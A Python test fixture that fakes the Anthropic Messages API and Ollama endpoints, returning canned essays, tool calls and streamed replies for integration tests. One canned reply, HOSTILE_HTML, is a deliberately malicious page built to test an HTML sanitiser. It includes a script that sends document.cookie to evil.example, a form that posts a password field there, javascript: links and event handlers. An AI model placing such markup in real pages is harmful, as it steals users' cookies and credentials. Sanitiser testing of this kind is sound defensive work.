"""A tiny fake of the Anthropic Messages API (and Ollama's /api/tags + /api/embed).

Lets the integration tests exercise routing, tool calling, streaming, artifact
sanitisation and persistence deterministically, with no model or network.
Behaviour is keyed off markers in the prompt:

  * user text contains "USE_TOOL:search"      → first round returns a tool_use for
                                                 search_transcripts, second round answers.
  * user text contains "TOPIC:"               → returns a canned ~1,200-word essay.
  * user text contains "Produce a COMPLETE HTML" → returns hostile HTML (script, onclick…).
  * user text contains "well-structured Markdown" → returns a markdown doc.
  * user text contains "FAIL_TIMEOUT"          → sleeps past the client timeout.
  * otherwise                                  → streams "Grounded answer … [1][2]".
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import math
import threading
import time
import uuid
from typing import Any

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, StreamingResponse

ESSAY_BODY = """# 5 Retention Lessons Growth Leaders Keep Relearning

Most teams chase acquisition. The best ones obsess over the second week.

Here's what the guests in these transcripts have learned about keeping users around [1].

## Retention is the foundation everything else stands on

Growth without retention is a leaky bucket [1]. **If users don't come back, nothing upstream matters.**
The guests describe measuring cohorts weekly rather than monthly [2]. That cadence surfaces problems early.
Fix the floor before you raise the ceiling.

## Define activation before you optimise it

Activation is the moment a user first experiences the core value [2].
Teams that skip this definition optimise the wrong funnel step [3]. One guest recommends interviewing retained users to find the shared early action [3]. Then instrument that action.
- Find the action retained users share
- Measure time-to-that-action
- Remove every step before it
**Activation is a hypothesis, not a metric you inherit.**

## Habit loops beat feature launches

New features rarely move retention [4]. What moves it is a trigger the user meets naturally [4].
The guests describe building notifications around real events rather than schedules [5]. Push at the moment of need. Not on Tuesday at 9am.
**Design the loop, then design the feature.**

## Resurrection is cheaper than acquisition

Dormant users already know the product [5]. Winning them back costs a fraction of a new signup [6].
One guest suggests a resurrection campaign tied to a genuinely new capability [6]. Generic "we miss you" emails underperform. Specific value performs.
- Segment dormant users by last action
- Match the message to what they used
- Measure return-and-retain, not opens

## Do this next

Pick one retained cohort this week and interview five people from it [3]. Ask what they did in their first session.

**TL;DR**
- Retention first, acquisition second [1]
- Define activation from retained users [2][3]
- Build loops, not launches [4]
- Resurrect before you acquire [5][6]

That's the whole playbook. Start Monday.
"""

# Pad the essay to the target length deterministically.
_PAD = (" The guests return to this point repeatedly, and the pattern holds across consumer and B2B products alike"
        " because the mechanism is behavioural rather than categorical [2].")
ESSAY = ESSAY_BODY.replace("Fix the floor before you raise the ceiling.", "Fix the floor before you raise the ceiling." + _PAD * 3)
ESSAY = ESSAY.replace("Then instrument that action.", "Then instrument that action." + _PAD * 3)
ESSAY = ESSAY.replace("Not on Tuesday at 9am.", "Not on Tuesday at 9am." + _PAD * 3)
ESSAY = ESSAY.replace("Specific value performs.", "Specific value performs." + _PAD * 3)
ESSAY = ESSAY.replace("Remove every step before it", "Remove every step before it" + _PAD * 4)
ESSAY = ESSAY.replace("Push at the moment of need.", "Push at the moment of need." + _PAD * 4)
ESSAY = ESSAY.replace("Generic \"we miss you\" emails underperform.", "Generic \"we miss you\" emails underperform." + _PAD * 4)
ESSAY = ESSAY.replace("Ask what they did in their first session.", "Ask what they did in their first session." + _PAD * 5)

HOSTILE_HTML = """<!doctype html><html><head><title>Growth Loops One-Pager</title>
<style>body{font-family:system-ui;max-width:760px;margin:2rem auto} h1{color:#0b6} .x{background:url(http://evil/px.gif)}</style>
<script>fetch('http://evil.example/steal?c='+document.cookie)</script></head>
<body><h1 onclick="alert(1)">Growth Loops</h1><p>Loops compound [1].</p>
<a href="javascript:alert(2)">click</a><iframe src="http://evil.example"></iframe>
<img src="http://evil.example/track.png"><form action="http://evil.example"><input name="pw"></form></body></html>"""

MARKDOWN_DOC = """# User Interview Checklist

## Before
- Recruit retained users [1]
- Write 5 open questions [2]

## During
- Ask about the last time, not the average time [2]

## Sources
[1] Guest — Episode
"""


def _text_of(msg: dict) -> str:
    c = msg.get("content")
    if isinstance(c, str):
        return c
    return " ".join(b.get("text", "") for b in c if isinstance(b, dict) and b.get("type") == "text")


def _decide(body: dict) -> dict:
    msgs = body.get("messages", [])
    last = msgs[-1] if msgs else {}
    last_text = _text_of(last)
    has_tool_result = isinstance(last.get("content"), list) and any(
        isinstance(b, dict) and b.get("type") == "tool_result" for b in last["content"]
    )
    tools = body.get("tools") or []
    if "FAIL_TIMEOUT" in last_text:
        return {"kind": "timeout"}
    if "TOPIC:" in last_text:
        return {"kind": "text", "text": ESSAY}
    if "Produce a COMPLETE HTML" in last_text:
        return {"kind": "text", "text": HOSTILE_HTML}
    if "well-structured Markdown" in last_text:
        return {"kind": "text", "text": MARKDOWN_DOC}
    if tools and "USE_TOOL:search" in last_text and not has_tool_result:
        # Use the name as advertised (the Agent SDK prefixes MCP tools: mcp__lenny__search_transcripts).
        name = next((t["name"] for t in tools if t["name"].endswith("search_transcripts")), "search_transcripts")
        return {"kind": "tool", "name": name, "input": {"query": "retention cohorts"}}
    if has_tool_result:
        return {"kind": "text", "text": "After searching again: retention is the foundation of growth [1]."}
    return {"kind": "text", "text": "Grounded answer: retention comes first, per the guests [1][2]."}


def _msg_id() -> str:
    return "msg_" + uuid.uuid4().hex[:12]


def create_app() -> FastAPI:
    app = FastAPI()
    app.state.calls: list[dict] = []

    @app.get("/api/tags")
    async def tags():
        return {"models": [{"name": "fake-model:latest"}, {"name": "nomic-embed-text:latest"}]}

    @app.post("/api/embed")
    async def embed(req: Request):
        body = await req.json()
        inputs = body["input"] if isinstance(body["input"], list) else [body["input"]]
        vecs = []
        for t in inputs:
            h = hashlib.sha256(t.encode()).digest()
            raw = [((h[i % len(h)] / 255.0) - 0.5) for i in range(768)]
            norm = math.sqrt(sum(x * x for x in raw)) or 1.0
            vecs.append([x / norm for x in raw])
        return {"embeddings": vecs}

    @app.post("/v1/messages")
    async def messages(req: Request):
        body = await req.json()
        app.state.calls.append(body)
        decision = _decide(body)
        if decision["kind"] == "timeout":
            await asyncio.sleep(8)  # client timeout in tests is 5s
        mid = _msg_id()
        model = body.get("model", "fake-model")
        if decision["kind"] == "tool":
            content = [{"type": "tool_use", "id": "toolu_" + uuid.uuid4().hex[:8], "name": decision["name"], "input": decision["input"]}]
            stop = "tool_use"
        else:
            content = [{"type": "text", "text": decision["text"]}]
            stop = "end_turn"
        usage = {"input_tokens": 100, "output_tokens": 50}

        if not body.get("stream"):
            return JSONResponse({"id": mid, "type": "message", "role": "assistant", "model": model,
                                 "content": content, "stop_reason": stop, "stop_sequence": None, "usage": usage})

        async def gen():
            def ev(name: str, data: dict) -> str:
                return f"event: {name}\ndata: {json.dumps(data)}\n\n"
            yield ev("message_start", {"type": "message_start", "message": {"id": mid, "type": "message", "role": "assistant", "model": model, "content": [], "stop_reason": None, "stop_sequence": None, "usage": {"input_tokens": 100, "output_tokens": 0}}})
            for i, block in enumerate(content):
                if block["type"] == "text":
                    yield ev("content_block_start", {"type": "content_block_start", "index": i, "content_block": {"type": "text", "text": ""}})
                    words = block["text"].split(" ")
                    for j in range(0, len(words), 8):
                        chunk = " ".join(words[j:j + 8]) + (" " if j + 8 < len(words) else "")
                        yield ev("content_block_delta", {"type": "content_block_delta", "index": i, "delta": {"type": "text_delta", "text": chunk}})
                        await asyncio.sleep(0)
                else:
                    yield ev("content_block_start", {"type": "content_block_start", "index": i, "content_block": {"type": "tool_use", "id": block["id"], "name": block["name"], "input": {}}})
                    yield ev("content_block_delta", {"type": "content_block_delta", "index": i, "delta": {"type": "input_json_delta", "partial_json": json.dumps(block["input"])}})
                yield ev("content_block_stop", {"type": "content_block_stop", "index": i})
            yield ev("message_delta", {"type": "message_delta", "delta": {"stop_reason": stop, "stop_sequence": None}, "usage": {"output_tokens": 50}})
            yield ev("message_stop", {"type": "message_stop"})

        return StreamingResponse(gen(), media_type="text/event-stream")

    return app


class FakeLLMServer:
    """Runs the fake in a background thread; `.url` is the base URL."""

    def __init__(self, port: int = 0):
        self.app = create_app()
        self.port = port or _free_port()
        self.url = f"http://127.0.0.1:{self.port}"
        cfg = uvicorn.Config(self.app, host="127.0.0.1", port=self.port, log_level="error", timeout_graceful_shutdown=1)
        self.server = uvicorn.Server(cfg)
        self.thread = threading.Thread(target=self.server.run, daemon=True)

    def start(self) -> "FakeLLMServer":
        self.thread.start()
        for _ in range(100):
            if self.server.started:
                return self
            time.sleep(0.05)
        raise RuntimeError("fake LLM did not start")

    def stop(self) -> None:
        self.server.should_exit = True
        self.thread.join(timeout=5)

    @property
    def calls(self) -> list[dict]:
        return self.app.state.calls


def _free_port() -> int:
    import socket

    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


if __name__ == "__main__":  # manual: python -m tests.fake_llm
    srv = FakeLLMServer(port=11435).start()
    print("fake LLM at", srv.url)
    while True:
        time.sleep(1)
